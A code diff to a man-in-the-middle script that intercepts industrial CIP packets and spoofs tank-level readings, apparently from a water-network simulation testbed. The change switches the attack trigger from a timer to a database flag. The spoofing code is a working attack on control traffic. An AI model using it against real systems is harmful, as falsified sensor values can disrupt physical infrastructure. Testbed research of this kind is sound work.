@@ -30,12 +30,15 @@ spoof_counter = 0
 spoof_attack_counter = 0
 
 nfqueue = NetfilterQueue()
+spoof_offset = 2.9
+
+attack_on = 0
 
 
 def spoof_value(raw):
     print ("Spoofing-----------")
     float_value = translate_load_to_float(raw)
-    fake_value = float_value + 2.9
+    fake_value = float_value + spoof_offset
     c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
     conn.commit()
     pay = translate_float_to_load(fake_value, raw[0], raw[1])
@@ -49,14 +52,16 @@ def capture(packet):
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
 
         if sys.argv[1] == '192.168.1.1':
-            global spoof_attack_counter
-            spoof_attack_counter += 1
             pay = spoof_value(raw)
             pkt[Raw].load = pay  # Replace the tank level with the spoofed one
             del pkt[TCP].chksum  # Needed to recalculate the checksum
             packet.set_payload(str(pkt))
 
-            if spoof_attack_counter > 400:
+            rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
+            conn.commit()
+            attack_on = int(rows[0][0])
+
+            if attack_on == 0:
                 print("Attack finished")
                 global spoof_phase
                 spoof_phase = 0
@@ -145,14 +150,19 @@ def prepare_network():
     args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
     subprocess.call(args, shell=False)
 
+
 if __name__ == '__main__':
     prepare_network()
-    sleep_count = 0
-    sleep_limit = 576
-    #sleep_limit = 1 #for debug onlyu
     print('[] Preparing attack')
-    while sleep_count < sleep_limit:
-        sleep_count += 1
-        time.sleep(1)
+    while True:
+
+        rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
+        conn.commit()
+        attack_on = int(rows[0][0])
+
+        if attack_on == 1:
+            break
+        else:
+            time.sleep(1)
     print('[*] Attack prepared')
     sys.exit(start())
